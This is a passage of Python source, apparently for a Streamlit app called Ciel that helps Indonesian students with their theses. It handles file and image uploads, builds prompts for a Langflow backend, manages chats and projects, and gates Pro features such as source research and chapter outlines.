MAX_CONTEXT_CHARS = 80_000
# Kirim ulang isi file proyek setiap N giliran, sebelum salinan lama keluar
# dari riwayat Agent (n_messages=10, yaitu 5 giliran tanya-jawab).
PROJECT_CONTEXT_REFRESH_TURNS = 4

# CSV/TSV dihitung utuh oleh Ciel Table Analyst; prompt hanya berisi cuplikan.
TABLE_FILE_TYPES = ("csv", "tsv")
MAX_TABLE_CHARS = 1_000_000
TABLE_PREVIEW_ROWS = 20
MAX_CHAT_TABLES = 5
# Proyek disimpan utuh di database untuk pengguna login (satu baris per
# proyek), termasuk tabel CSV/TSV. Batas per proyek: satu tabel ukuran penuh
# (MAX_TABLE_CHARS) plus banyak file teks (masing-masing <= MAX_FILE_CHARS).
# Terburuk sekitar 20 MB per akun sebelum kompresi Postgres.
MAX_PROJECTS = 10
MAX_PROJECT_CHARS = 2_000_000
HISTORY_LIMIT = 12
DEFAULT_FILE_QUESTION = "Tolong baca dan rangkum file yang saya lampirkan."
DEFAULT_IMAGE_QUESTION = "Tolong jelaskan gambar yang saya lampirkan."


def short(text, limit):
    text = " ".join(str(text).split())

    if len(text) <= limit:
        return text

    return text[: limit - 1].rstrip() + "…"


def format_size(size):
    if size < 1024:
        return f"{size} B"

    return f"{size / 1024:.1f} KB"


def is_error_answer(text):
    return isinstance(text, CielError)


def split_error(text):
    """Pisahkan pesan error menjadi judul, penjelasan, dan detail teknis."""

    paragraphs = [p.strip() for p in str(text).split("\n\n") if p.strip()]

    if not paragraphs:
        return "Terjadi kesalahan", [], []

    title = re.sub(r"^[^\w`]+", "", paragraphs[0].splitlines()[0]).strip()
    title = title.rstrip(".") or "Terjadi kesalahan"

    extra = paragraphs[0].splitlines()[1:]
    rest = (["\n".join(extra)] if extra else []) + paragraphs[1:]

    technical_markers = ("HTTP Status", "Request ID", "```")
    plain = [p for p in rest if not any(m in p for m in technical_markers)]
    technical = [p for p in rest if any(m in p for m in technical_markers)]

    return title, plain, technical


# ------------------------------------------------------------
# FILES
# ------------------------------------------------------------

def pdf_text(raw):
    """
    Ambil teks dari PDF tanpa OCR. Berhenti begitu teks melewati
    MAX_FILE_CHARS atau setelah MAX_PDF_PAGES halaman, supaya PDF besar
    tidak membuat server sibuk lama. ValueError jika PDF dikunci sandi.
    """
    reader = PdfReader(io.BytesIO(raw))

    if reader.is_encrypted and not reader.decrypt(""):
        raise ValueError("encrypted")

    parts, total = [], 0

    for page in reader.pages[:MAX_PDF_PAGES]:
        text = (page.extract_text() or "").strip()
        parts.append(text)
        total += len(text)

        if total > MAX_FILE_CHARS:
            break

    return "\n\n".join(part for part in parts if part)


def read_text_file(uploaded):
    """Baca file unggahan sebagai teks. Kembalikan (data, error)."""

    raw = uploaded.getvalue()

    if file_extension(uploaded.name) == "pdf":
        try:
            text = pdf_text(raw)
        except ValueError as error:
            if str(error) == "encrypted":
                return None, f"{uploaded.name}: PDF ini dikunci kata sandi."
            logger.warning("pdf_read_error name=%s error=%s", uploaded.name, error)
            return None, f"{uploaded.name}: PDF tidak bisa dibaca."
        except Exception as error:  # pypdf raises many types on damaged files
            logger.warning("pdf_read_error name=%s error=%s", uploaded.name, error)
            return None, f"{uploaded.name}: PDF tidak bisa dibaca."

        if not text:
            return None, (
                f"{uploaded.name}: tidak ada teks yang bisa dibaca di PDF ini "
                "(mungkin hasil scan). Kirim sebagai foto agar Ciel bisa melihatnya."
            )

    elif b"\x00" in raw[:4096]:
        return None, f"{uploaded.name}: bukan file teks."

    else:
        text = raw.decode("utf-8", errors="replace")

    if file_extension(uploaded.name) in TABLE_FILE_TYPES:
        return read_table_text(uploaded.name, text, len(raw)), None

    truncated = len(text) > MAX_FILE_CHARS

    if truncated:
        text = text[:MAX_FILE_CHARS]

    return {
        "name": uploaded.name,
        "text": text,
        "size": len(raw),
        "truncated": truncated,
    }, None


def read_table_text(name, text, size):
    """
    CSV/TSV: simpan isi utuh untuk Ciel Table Analyst, dan hanya cuplikan
    beberapa baris untuk prompt. Model tidak perlu (dan tidak boleh)
    menghitung dari cuplikan, sehingga token tetap kecil.
    """
    lines = text.splitlines()
    rows = max(len(lines) - 1, 0)

    return {
        "name": name,
        "text": "\n".join(lines[: TABLE_PREVIEW_ROWS + 1]),
        "size": size,
        "truncated": False,
        "rows": rows,
        "table": {
            "text": text[:MAX_TABLE_CHARS],
            "truncated": len(text) > MAX_TABLE_CHARS,
        },
    }


def project_signature(project_files):
    """Berubah jika file proyek ditambah, dihapus, atau isinya berbeda."""

    digest = hashlib.sha256()

    for item in project_files:
        digest.update(item["name"].encode("utf-8"))
        digest.update(b"\0")
        digest.update(item["text"].encode("utf-8"))
        digest.update(b"\0")

    return digest.hexdigest()[:16]


def project_context_due(chat, project_files, user_turn):
    """
    Kirim isi file proyek hanya jika chat baru, file berubah, atau salinan
    terakhir hampir keluar dari riwayat Agent. Langflow menyimpan setiap
    pesan beserta isi file, dan Agent memuat 10 pesan terakhir (5 giliran),
    jadi mengirim ulang di setiap pesan membuat file yang sama terbaca
    berkali-kali dalam satu permintaan.
    """
    if not project_files:
        return False

    sent = (chat or {}).get("project_context")

    if not sent or sent["signature"] != project_signature(project_files):
        return True

    return user_turn - sent["turn"] >= PROJECT_CONTEXT_REFRESH_TURNS


def build_payload(text, files, project_files, project_note=()):
    """
    Gabungkan isi file dan pertanyaan menjadi satu teks untuk Langflow.
    `project_note` berisi nama file proyek yang isinya sudah dikirim
    sebelumnya di chat ini (masih ada di riwayat Agent).
    """

    blocks = []
    budget = MAX_CONTEXT_CHARS

    def add(label, item):
        nonlocal budget

        if budget <= 0:
            return

        body = item["text"][:budget]
        budget -= len(body)

        cut = item.get("truncated") or len(body) < len(item["text"])
        note = " (dipotong)" if cut else ""

        if "table" in item:
            shown = min(item["rows"], TABLE_PREVIEW_ROWS)
            note = (
                f" (cuplikan {shown} dari {item['rows']} baris; "
                "hitung angka dengan Ciel Table Analyst, model ML dengan Ciel ML Analyst)"
            )

        blocks.append(f"### {label}: {item['name']}{note}\n{body}")

    for item in project_files:
        add("File proyek", item)

    if project_note:
        blocks.append(
            "### File proyek (isinya sudah dikirim di pesan sebelumnya "
            "dalam percakapan ini): " + ", ".join(project_note)
        )

    for item in files:
        add("File terlampir", item)

    if not blocks:
        return text

    return (
        "Gunakan isi file berikut sebagai konteks.\n\n"
        + "\n\n".join(blocks)
        + "\n\n### Pertanyaan\n"
        + text
    )


# ------------------------------------------------------------
# STATE: CHATS & PROJECTS
# ------------------------------------------------------------

def active_chat():
    return st.session_state.chats.get(st.session_state.active_chat)


def current_messages():
    chat = active_chat()
    return chat["messages"] if chat else []


def context_project_id():
    chat = active_chat()

    if chat:
        return chat["project_id"]

    return st.session_state.active_project


def project_files_for(project_id):
    project = st.session_state.projects.get(project_id)
    return project["files"] if project else []


def file_extension(name):
    return str(name).rsplit(".", 1)[-1].lower() if "." in str(name) else ""


def read_image(uploaded):
    """Baca gambar unggahan. Kembalikan (data, error)."""

    raw = uploaded.getvalue()

    if len(raw) > MAX_IMAGE_BYTES:
        return None, (
            f"{uploaded.name}: ukuran melebihi "
            f"{MAX_IMAGE_BYTES // (1024 * 1024)} MB."
        )

    unreadable = f"{uploaded.name}: file ini bukan gambar yang bisa dibaca."

    try:
        with Image.open(io.BytesIO(raw)) as img:
            pixels = img.width * img.height
    except Image.DecompressionBombError:
        pixels = MAX_IMAGE_PIXELS + 1
    except Exception:
        security_event("image_rejected", reason="unreadable")
        return None, unreadable

    if pixels > MAX_IMAGE_PIXELS:
        security_event("image_rejected", reason="pixels")
        return None, (
            f"{uploaded.name}: resolusi gambar terlalu besar "
            f"(maks. {MAX_IMAGE_PIXELS // 1_000_000} megapiksel)."
        )

    image = fit_for_vision({
        "name": uploaded.name,
        "data": raw,
        "mime": IMAGE_MIME.get(file_extension(uploaded.name), "image/png"),
    })

    if image is None:
        security_event("image_rejected", reason="unreadable")
        return None, unreadable

    return image, None


def fit_for_vision(image):
    """
    Upright the photo (EXIF orientation) and shrink it to VISION_IMAGE_PX on
    the longest side. Small upright images are sent as is; None when the file
    cannot be decoded, so a broken or hostile file never reaches the backend.
    """
    try:
        with Image.open(io.BytesIO(image["data"])) as img:
            rotated = img.getexif().get(0x0112, 1) not in (0, 1)  # EXIF Orientation
            if not rotated and max(img.size) <= VISION_IMAGE_PX:
                return image
            upright = ImageOps.exif_transpose(img)
            upright.thumbnail((VISION_IMAGE_PX, VISION_IMAGE_PX))
            if upright.mode in ("RGBA", "LA", "P"):
                rgba = upright.convert("RGBA")
                upright = Image.new("RGB", rgba.size, "white")
                upright.paste(rgba, mask=rgba.getchannel("A"))
            out = io.BytesIO()
            upright.convert("RGB").save(out, format="JPEG", quality=88)
    except Exception:
        return None

    stem = str(image["name"]).rsplit(".", 1)[0]
    return {"name": f"{stem}.jpg", "data": out.getvalue(), "mime": "image/jpeg"}


def make_thumbnail(image):
    """
    Perkecil gambar yang sudah terkirim agar riwayat chat tidak menyimpan
    file asli (hingga 5 MB per foto) di memori server selama sesi berjalan.
    """
    try:
        with Image.open(io.BytesIO(image["data"])) as img:
            img.thumbnail((THUMBNAIL_PX, THUMBNAIL_PX))
            out = io.BytesIO()
            img.convert("RGB").save(out, format="JPEG", quality=82)
    except Exception:
        return image

    return {**image, "data": out.getvalue(), "mime": "image/jpeg"}


def chat_tables(chat):
    """File CSV/TSV yang bisa dihitung di chat ini: file proyek + lampiran chat."""

    tables = {
        item["name"]: item["table"]
        for item in project_files_for(chat["project_id"])
        if "table" in item
    }
    tables.update(chat.get("tables", {}))

    return tables


def encode_tables(tables):
    """
    Base64 dari JSON tabel. Langflow mengubah setiap backslash-n di input
    teks menjadi baris baru, yang merusak JSON biasa; base64 tidak memuat
    backslash sehingga isi file sampai utuh ke Ciel Table Analyst.
    """
    if not tables:
        return ""

    raw = json.dumps(tables, ensure_ascii=False).encode("utf-8")

    return base64.b64encode(raw).decode("ascii")


def build_tweaks(image_paths=None, tables=None):
    owner = memory_owner_id()
    encoded_tables = encode_tables(tables)

    tweaks = {
        MEMORY_SEARCH_ID: {"memory_owner": owner},
        MEMORY_STORE_ID: {"memory_owner": owner},
        TABLE_ANALYST_ID: {"attached_tables": encoded_tables, "memory_owner": owner},
        ML_ANALYST_ID: {"attached_tables": encoded_tables, "memory_owner": owner},
        DATASET_STORE_ID: {"attached_tables": encoded_tables, "memory_owner": owner},
    }

    if image_paths:
        tweaks[CHAT_INPUT_ID] = {
            "files": (
                image_paths[0]
                if len(image_paths) == 1
                else image_paths
            )
        }

    return tweaks


def make_pending(text, uploaded_files):
    """Bangun permintaan yang menunggu diproses dari teks dan lampiran."""

    uploaded_files = list(uploaded_files)

    image_uploads = [
        u for u in uploaded_files
        if file_extension(u.name) in ALLOWED_IMAGE_TYPES
    ]
    text_uploads = [u for u in uploaded_files if u not in image_uploads]

    files = []

    for uploaded in text_uploads[:MAX_FILES_PER_MESSAGE]:

        data, error = read_text_file(uploaded)

        if error:
            st.toast(error, icon=":material/error:")
            continue

        files.append(data)

    if len(text_uploads) > MAX_FILES_PER_MESSAGE:
        st.toast(
            f"Maksimal {MAX_FILES_PER_MESSAGE} file per pesan.",
            icon=":material/info:",
        )

    images = []

    for uploaded in image_uploads[:MAX_IMAGES_PER_MESSAGE]:

        data, error = read_image(uploaded)

        if error:
            st.toast(error, icon=":material/error:")
            continue

        images.append(data)

    if len(image_uploads) > MAX_IMAGES_PER_MESSAGE:
        st.toast(
            f"Maksimal {MAX_IMAGES_PER_MESSAGE} foto per pesan.",
            icon=":material/info:",
        )

    text = (text or "").strip()

    if not text:
        text = DEFAULT_IMAGE_QUESTION if images else DEFAULT_FILE_QUESTION

    chat = active_chat()
    # Di chat Riset Skripsi, peta sumbernya ikut seperti file proyek supaya
    # pertanyaan lanjutan ("sumber nomor 3 tadi apa?") bisa dijawab flow utama.
    project_files = project_files_for(context_project_id()) + riset_report(chat)
    user_turn = sum(1 for m in (chat or {}).get("messages", []) if m["role"] == "user")
    send_project = project_context_due(chat, project_files, user_turn)

    return {
        "text": text,
        "files": [f["name"] for f in files],
        "images": images,
        "tables": {f["name"]: f["table"] for f in files if "table" in f},
        "project_context": (
            {"signature": project_signature(project_files), "turn": user_turn}
            if send_project
            else None
        ),
        "payload": build_payload(
            text,
            files,
            project_files if send_project else [],
            project_note=() if send_project else [f["name"] for f in project_files],
        ),
    }


def unpack_chat_input(value):
    if isinstance(value, str):
        return value, []

    return value["text"], list(value["files"] or [])


def current_view():
    # Disimpan di URL (?page=pricing, ?page=privacy, ?page=login) agar halaman bisa dibagikan.
    # Midtrans menambahkan parameternya sendiri ke URL kembali, kadang dengan
    # "?" kedua ("pricing?order_id=..."), jadi hanya bagian depannya yang dipakai.
    page = (st.query_params.get("page") or "").split("?", 1)[0]
    return page if page in ("pricing", "privacy", "login") else "chat"


def show_chat():
    st.query_params.pop("page", None)


def show_pricing():
    st.query_params["page"] = "pricing"


def show_privacy():
    st.query_params["page"] = "privacy"


def show_login():
    st.query_params["page"] = "login"


def page_nav_buttons():
    """Pricing dan Privasi sebagai baris menu akun (hanya setelah login)."""
    for label, view, icon, on_click in (
        ("Pricing", "pricing", ":material/sell:", show_pricing),
        ("Privasi", "privacy", ":material/shield:", show_privacy),
    ):
        st.button(
            label,
            key=("navactive_" if current_view() == view else "nav_") + view,
            type="tertiary",
            icon=icon,
            on_click=on_click,
        )


def new_chat():
    show_chat()
    st.session_state.active_chat = None
    st.session_state.pending = None


def select_chat(chat_id):
    show_chat()
    st.session_state.active_chat = chat_id
    st.session_state.pending = None


def select_project(project_id):
    show_chat()
    st.session_state.active_project = project_id
    st.session_state.active_chat = None
    st.session_state.pending = None


def create_project():
    name = (st.session_state.get("newproj_name") or "").strip()

    if not name:
        return

    if len(st.session_state.projects) >= MAX_PROJECTS:
        st.toast(
            f"Maksimal {MAX_PROJECTS} proyek. Hapus proyek lama dulu.",
            icon=":material/error:",
        )
        return

    project_id = uuid.uuid4().hex[:8]

    project = st.session_state.projects[project_id] = {
        "id": project_id,
        "name": name,
        "created": time.time(),
        "files": [],
    }

    persist_project(project)
    st.session_state.newproj_name = ""
    select_project(project_id)


def delete_project(project_id):
    owner = chat_owner()

    if owner and not CHAT_STORE.delete_project(owner, project_id):
        store_notice("Proyek gagal dihapus. Silakan coba lagi.")
        return

    st.session_state.projects.pop(project_id, None)

    for chat in st.session_state.chats.values():
        if chat["project_id"] == project_id:
            chat["project_id"] = None
            persist_chat(chat)

    select_project(None)


def project_file_chars(item):
    return len(item["text"]) + len(item.get("table", {}).get("text", ""))


def add_project_files(project_id, upload_key):
    uploaded_files = st.session_state.get(upload_key) or []
    project = st.session_state.projects.get(project_id)

    if project is None:
        return

    known = {item["name"] for item in project["files"]}
    used = sum(project_file_chars(item) for item in project["files"])
    added = False

    for uploaded in uploaded_files:

        if uploaded.name in known:
            continue

        data, error = read_text_file(uploaded)

        if not error and used + project_file_chars(data) > MAX_PROJECT_CHARS:
            error = (
                f"{uploaded.name}: ruang file proyek ini penuh. "
                "Hapus file lain dulu atau buat proyek baru."
            )

        if error:
            st.toast(error, icon=":material/error:")
            continue

        project["files"].append(data)
        known.add(uploaded.name)
        used += project_file_chars(data)
        added = True

    if added:
        persist_project(project)

    # Ganti key uploader agar daftar yang sudah diproses dikosongkan.
    st.session_state.upload_nonce += 1


def remove_project_file(project_id, name):
    project = st.session_state.projects.get(project_id)

    if project:
        project["files"] = [
            item for item in project["files"] if item["name"] != name
        ]
        persist_project(project)


def delete_chat(chat_id):
    """Hapus satu chat dari sidebar, database, dan memori percakapan Langflow."""

    owner = chat_owner()

    if owner and not CHAT_STORE.delete(owner, chat_id):
        store_notice("Chat gagal dihapus. Silakan coba lagi.")
        return

    st.session_state.chats.pop(chat_id, None)

    try:
        delete_langflow_sessions([f"{user_key()}-{chat_id}"])
    except requests.exceptions.RequestException as error:
        # Pesan di server tetap terhapus otomatis setelah CHAT_RETENTION_DAYS.
        logger.error("chat_session_delete_error type=%s error=%s", type(error).__name__, error)

    if st.session_state.active_chat == chat_id:
        new_chat()


def set_archived(chat_id, archived):
    chat = st.session_state.chats.get(chat_id)

    if chat is None:
        return

    chat["archived"] = archived
    persist_chat(chat)

    if archived and st.session_state.active_chat == chat_id:
        new_chat()


MEMORY_LIST_TIMEOUT = 8

# The one chat input; the Beranda shows it inline, the chat at the bottom.
COMPOSER_KEY = "composer"


def fill_composer(text):
    """Template button: the sentence goes into the composer to be edited."""
    st.session_state[COMPOSER_KEY] = text


def open_kerangka_from(chat_id, map_index, topic):
    """Kerangka template: open the chat holding the map, then its dialog."""
    select_chat(chat_id)
    open_kerangka_dialog(topic, map_index)


def session_memories():
    """The account's memories, listed at most once per session (one flow call)."""

    if not (logged_in() and MEMORY_ADMIN_FLOW_ID):
        return []

    # The listing runs inside the page's run and blocks it, so it gives up
    # after a few seconds instead of memory_admin's 60.
    if not st.session_state.get("memories_loaded"):
        st.session_state.memories_loaded = True
        st.session_state.my_memories = memory_admin("list", timeout=MEMORY_LIST_TIMEOUT)

    listing = st.session_state.get("my_memories") or {}
    return list(listing.get("memories") or []) if listing.get("ok") else []


def composer(placeholder):
    return st.chat_input(
        placeholder,
        key=COMPOSER_KEY,
        accept_file="multiple",
        file_type=ALLOWED_FILE_TYPES + ALLOWED_IMAGE_TYPES,
        max_chars=MAX_MESSAGE_CHARS,
    )


def take_composer_value(value):
    """Turn a submitted composer value into the pending request."""

    if not value:
        return

    typed_text, typed_files = unpack_chat_input(value)

    # max_chars hanya dicek di browser; permintaan buatan sendiri bisa melewatinya.
    if len(typed_text) > MAX_MESSAGE_CHARS:
        security_event("message_too_long", length=len(typed_text))
        st.toast(
            "Pesan terlalu panjang (maks. 10.000 karakter). Lampirkan teks panjang sebagai file.",
            icon=":material/error:",
        )

    elif typed_text.strip() or typed_files:
        st.session_state.pending = make_pending(typed_text, typed_files)


FULL_LABEL_LIMIT = 200
MEMORY_PREVIEW_LIMIT = 220
SENTENCE_END = re.compile(r"(?<=[.!?])\s+")


def sentence_preview(text, limit=MEMORY_PREVIEW_LIMIT):
    """(whole sentences up to about `limit` characters, the rest).

    Never cuts a sentence: a first sentence longer than `limit` is kept whole.
    Defined here, not in beranda.py: app.py is re-run on every deploy, while
    Streamlit Cloud once kept a stale beranda module and the import failed.
    """

    text = " ".join(str(text or "").split())
    if len(text) <= limit:
        return text, ""
    sentences = SENTENCE_END.split(text)
    preview = sentences[0]
    count = 1
    while count < len(sentences) and len(preview) + 1 + len(sentences[count]) <= limit:
        preview = f"{preview} {sentences[count]}"
        count += 1
    return preview, " ".join(sentences[count:])


def memory_row_html(item):
    """One memory: short ones whole; long ones open with whole sentences."""

    preview, rest = sentence_preview(item.get("text", ""))
    category = f"<em>{html.escape(str(item['category']))}</em>" if item.get("category") else ""
    if not rest:
        return f'<div class="ciel-home-row"><span>{html.escape(preview)}</span>{category}</div>'
    return (
        '<details class="ciel-home-row ciel-home-more">'
        f"<summary>{html.escape(preview)} <b>Selengkapnya</b></summary>"
        # UI_JS closes the row from this button, at the end of the text.
        f'<span>{html.escape(rest)} <button type="button" class="ciel-home-less">Lebih sedikit</button></span>'
        "</details>"
    )


def chat_label(chat):
    """The chat's name as a whole sentence.

    Titles are cut at 48 characters (ending in "…") when a chat is created; a
    cut title is replaced by the chat's first question when that question is
    not too long. Uncut titles stay as they are.
    """

    title = chat["title"]
    if not title.endswith("…"):
        return title
    first = next((m.get("content") for m in chat.get("messages", []) if m.get("role") == "user"), "")
    first = " ".join(str(first or "").split())
    return first if first and len(first) <= FULL_LABEL_LIMIT else title


def render_beranda():
    """Beranda: greeting, the composer, template buttons, recent chats, memories.

    Returns the composer's value (the composer lives here on this page).
    """

    project = st.session_state.projects.get(st.session_state.active_project)
    project_id = project["id"] if project else None
    visible = [
        chat for chat in st.session_state.chats.values()
        if not chat.get("archived") and (project_id is None or chat["project_id"] == project_id)
    ]
    name = (st.user.get("name") or "") if logged_in() else None
    subline = (
        f"{short(project['name'], 40)} · {len(visible)} chat · {len(project['files'])} file proyek"
        if project
        else f"Semua chat · {len(visible)} chat"
    )

    st.markdown(
        '<div class="ciel-home-head">'
        f"<h1>{html.escape(greeting(time.time(), name))}</h1>"
        f"<p>{html.escape(subline)}</p>"
        "</div>",
        unsafe_allow_html=True,
    )

    value = composer("Tanya soal skripsimu" if project else "Tanyakan sesuatu kepada Ciel...")
    riset = latest_riset(st.session_state.chats.values(), project_id)

    with st.container(key="templates", horizontal=True, gap="small"):

        for template in templates_for(bool(project and project["files"]), riset is not None, RISET_ENABLED, WRITER_ENABLED):

            label = f"{template.label} · Pro" if template.pro else template.label

            if template.action == "fill":
                st.button(label, key=f"tpl_{template.key}", on_click=fill_composer, args=(template.text,))
            elif template.action == "riset":
                st.button(label, key=f"tpl_{template.key}", on_click=open_riset_dialog)
            else:
                chat, index = riset
                topic = chat["messages"][index].get("topic") or "Riset Skripsi"
                st.button(label, key=f"tpl_{template.key}", on_click=open_kerangka_from, args=(chat["id"], index, topic))

    recent = sorted(visible, key=lambda chat: chat["updated"], reverse=True)[:3]
    memories = session_memories()[:4]

    if not (recent or memories):
        return value

    with st.container(key="homepanels", horizontal=True):

        if recent:
            with st.container(key="home_recent"):
                st.markdown('<p class="ciel-home-h">Lanjutkan riset</p>', unsafe_allow_html=True)
                for chat in recent:
                    st.button(
                        f"{chat_label(chat)}  ·  {relative_time(chat['updated'], time.time())}",
                        key=f"home_chat_{chat['id']}",
                        on_click=select_chat,
                        args=(chat["id"],),
                        width="stretch",
                    )

        if memories:
            with st.container(key="home_memory"):
                rows = "".join(memory_row_html(item) for item in memories)
                st.markdown(f'<p class="ciel-home-h">Yang Ciel ingat</p>{rows}', unsafe_allow_html=True)

    return value


# ------------------------------------------------------------
# RISET SKRIPSI (PRO)
# ------------------------------------------------------------

# Same value as beranda.RISET_KIND (tests/test_beranda.py checks it).
RISET_KIND = "riset_skripsi"
RISET_YEAR_SPANS = (3, 5, 10)
MAX_RISET_TOPIC_CHARS = 300
MAX_RISET_FIELD_CHARS = 80


def riset_payload(topic, field, min_year):
    """Teks permintaan untuk flow Ciel Riset Skripsi."""

    lines = [f"Topik skripsi: {topic}"]

    if field:
        lines.append(f"Bidang ilmu: {field}")

    lines.append(f"Rentang sumber: tahun {min_year} sampai sekarang.")
    return "\n".join(lines)


def riset_start_date(riset):
    """Awal rentang sumber untuk filter tanggal terbit Exa: 2021 -> "2021-01-01"."""
    return f"{int(riset['min_year'])}-01-01"


def make_riset_pending(topic, field, years):
    # Semua input disimpan di "riset" (ikut tersimpan di pesan pengguna), jadi
    # payload bisa disusun ulang untuk Coba lagi setelah halaman dimuat ulang.
    riset = {"topic": topic, "field": field, "min_year": time.gmtime().tm_year - years}

    return {
        "text": f"Riset Skripsi: {topic}",
        "files": [],
        "images": [],
        "payload": riset_payload(**riset),
        "riset": riset,
    }


def riset_report(chat):
    """Peta sumber terakhir di chat ini sebagai file konteks untuk pertanyaan lanjutan."""

    reports = [
        m for m in (chat or {}).get("messages", [])
        if m.get("kind") == RISET_KIND and not m.get("error")
    ]

    if not reports:
        return []

    text = str(reports[-1]["content"])
    return [{"name": "Peta sumber (Riset Skripsi).md", "text": text, "size": len(text.encode("utf-8"))}]


def pro_refusal(enabled, feature, kind):
    """None jika akun ini boleh memakai fitur Pro `feature`, atau CielError penjelasannya."""

    if not enabled:
        return CielError(f"{feature} belum aktif.\n\nFitur ini belum tersedia di deployment ini.")

    if not logged_in():
        return CielError(f"{feature} khusus Ciel Pro.\n\nMasuk dengan akun Google yang sudah Pro, lalu coba lagi.")

    # Dibaca langsung dari database, bukan dari cache tampilan.
    until = pro_until(refresh=True)

    if until is None:
        return CielError(
            "Status Pro belum bisa diperiksa.\n\n"
            "Silakan coba lagi sebentar lagi.\n\n"
            "Penyebab: database status Pro tidak bisa dihubungi."
        )

    if until <= time.time():
        security_event("pro_required", feature=kind)
        return CielError(
            f"{feature} khusus Ciel Pro.\n\n"
            + (
                f"Masa Pro akunmu berakhir {format_date_id(until)}."
                if until
                else "Akun ini belum Pro. Lihat halaman Pricing untuk paket Pro."
            )
        )

    return None


def riset_refusal():
    return pro_refusal(RISET_ENABLED, "Riset Skripsi", RISET_KIND)


def open_riset_dialog():
    show_chat()
    st.session_state.open_riset = True


def start_riset(topic, field, years):
    """Tombol "Mulai riset" di dialog: buka chat baru berisi permintaan riset."""

    show_chat()
    st.session_state.active_chat = None
    st.session_state.pending = make_riset_pending(topic, field, years)


@st.dialog("Riset Skripsi")
def riset_dialog():

    st.markdown(
        '<p class="ciel-riset-lead">Ciel mencari dan membaca sumber untuk topik '
        "skripsimu, lalu menyusun <b>peta sumber</b>: ringkasan tiap sumber per "
        "tema, celah riset, pertanyaan untuk dosen pembimbing, dan daftar pustaka "
        "APA 7 yang bisa diunduh sebagai DOCX. Ciel tidak menulis babmu; setiap "
        "sumber bisa kamu buka dan cek.</p>",
        unsafe_allow_html=True,
    )

    if not is_pro():

        st.markdown(
            '<p class="ciel-riset-lock">Fitur ini khusus <b>Ciel Pro</b>.</p>',
            unsafe_allow_html=True,
        )

        if st.button("Lihat paket Pro", type="primary", icon=":material/sell:"):
            show_pricing()
            st.rerun()

        return

    topic = st.text_area(
        "Topik atau judul skripsi",
        max_chars=MAX_RISET_TOPIC_CHARS,
        placeholder="Contoh: Pengaruh literasi digital terhadap kinerja UMKM kuliner",
    )

    field = st.text_input(
        "Bidang ilmu (opsional)",
        max_chars=MAX_RISET_FIELD_CHARS,
        placeholder="Contoh: Manajemen",
    )

    years = st.segmented_control(
        "Sumber dari",
        RISET_YEAR_SPANS,
        default=5,
        format_func=lambda span: f"{span} tahun terakhir",
    )

    st.caption(
        f"Bisa sampai beberapa menit. Kuota {RISET_SKRIPSI_PER_DAY} riset per hari."
    )

    if st.button("Mulai riset", type="primary", icon=":material/travel_explore:"):

        topic = " ".join((topic or "").split())[:MAX_RISET_TOPIC_CHARS]
        field = " ".join((field or "").split())[:MAX_RISET_FIELD_CHARS]

        if not topic:
            st.error("Tulis topik atau judul skripsimu dulu.")
            return

        start_riset(topic, field, years if years in RISET_YEAR_SPANS else 5)
        st.rerun()


# ------------------------------------------------------------
# KERANGKA BAB 1-3 (PRO)
# ------------------------------------------------------------

KERANGKA_KIND = "kerangka_skripsi"


def kerangka_refusal():
    return pro_refusal(WRITER_ENABLED, "Kerangka Bab 1–3", KERANGKA_KIND)


def map_message(chat, map_index):
    """Pesan peta sumber (hasil Riset Skripsi) di posisi map_index chat ini, atau None."""

    messages = (chat or {}).get("messages", [])

    if isinstance(map_index, int) and 0 <= map_index < len(messages):
        message = messages[map_index]
        if message.get("kind") == RISET_KIND and not message.get("error"):
            return message

    return None


def kerangka_source(chat, kerangka):
    """Isi peta sumber yang dipilih untuk kerangka, atau None."""

    message = map_message(chat, kerangka.get("map_index"))
    return str(message["content"]) if message else None


def missing_map(chat, request, button):
    """CielError jika peta sumber yang dipilih tidak ada lagi di chat ini (mis. pesan dihapus)."""

    if map_message(chat, request.get("map_index")) is None:
        return CielError(
            "Peta sumber tidak ditemukan.\n\n"
            f"Buka chat Riset Skripsi-nya, lalu klik \"{button}\" di bawah peta sumber."
        )

    return None


def make_kerangka_pending(topic, approach, research_object, map_index):
    # Seperti Riset Skripsi, semua input ikut tersimpan di pesan pengguna
    # supaya Coba lagi bisa menyusun ulang permintaannya.
    return {
        "text": f"Kerangka Bab 1–3: {topic}",
        "files": [],
        "images": [],
        "payload": "",
        "kerangka": {
            "topic": topic,
            "approach": approach,
            "object": research_object,
            "map_index": map_index,
        },
    }


def open_kerangka_dialog(topic, map_index):
    st.session_state.open_kerangka = {"topic": topic, "map_index": map_index}


@st.dialog("Kerangka Bab 1–3")
def kerangka_dialog(topic, map_index):

    st.markdown(
        '<p class="ciel-riset-lead">Ciel menyusun kerangka <b>Bab 1–3</b> dari peta '
        "sumber ini: poin argumen yang didukung sumber, usulan rumusan masalah, "
        "kerangka berpikir, dan keputusan metode, lengkap dengan pertanyaan pemandu. "
        "Isinya poin, bukan paragraf; kamu yang menulis babnya.</p>",
        unsafe_allow_html=True,
    )

    if not is_pro():

        st.markdown(
            '<p class="ciel-riset-lock">Fitur ini khusus <b>Ciel Pro</b>.</p>',
            unsafe_allow_html=True,
        )

        if st.button("Lihat paket Pro", type="primary", icon=":material/sell:"):
            show_pricing()
            st.rerun()

        return

    approach = st.segmented_control(
        "Pendekatan penelitian",
        APPROACHES,
        default="Belum tahu",
    )

    research_object = st.text_input(
        "Objek atau lokasi penelitian (opsional)",
        max_chars=MAX_OBJECT_CHARS,
        placeholder="Contoh: UMKM kuliner di Kota Bandung",
    )

    st.caption(f"Sekitar setengah menit. Kuota {KERANGKA_PER_DAY} kerangka per hari.")

    if st.button("Susun kerangka", type="primary", icon=":material/account_tree:"):

        research_object = " ".join((research_object or "").split())[:MAX_OBJECT_CHARS]
        st.session_state.pending = make_kerangka_pending(
            topic,
            approach if approach in APPROACHES else "Belum tahu",
            research_object,
            map_index,
        )
        st.rerun()


# ------------------------------------------------------------
# CEK KUTIPAN & KEMIRIPAN (PRO)
# ------------------------------------------------------------

CEK_KIND = "cek_kutipan"
DRAFT_FILE_TYPES = ["docx", "txt"]


def cek_refusal():
    return pro_refusal(CHECK_ENABLED, "Cek kutipan & kemiripan", CEK_KIND)


def make_cek_pending(topic, draft, map_index):
    # Draf ikut di permintaan supaya Coba lagi bisa memeriksa ulang. Setelah
    # pemeriksaan berhasil, draf dibuang dari pesan pengguna (PROCESS NEW MESSAGE).
    return {
        "text": f"Cek kutipan & kemiripan: {topic} ({word_count(draft)} kata)",
        "files": [],
        "images": [],
        "payload": "",
        "cek": {"topic": topic, "draft": draft, "map_index": map_index},
    }


def open_cek_dialog(topic, map_index):
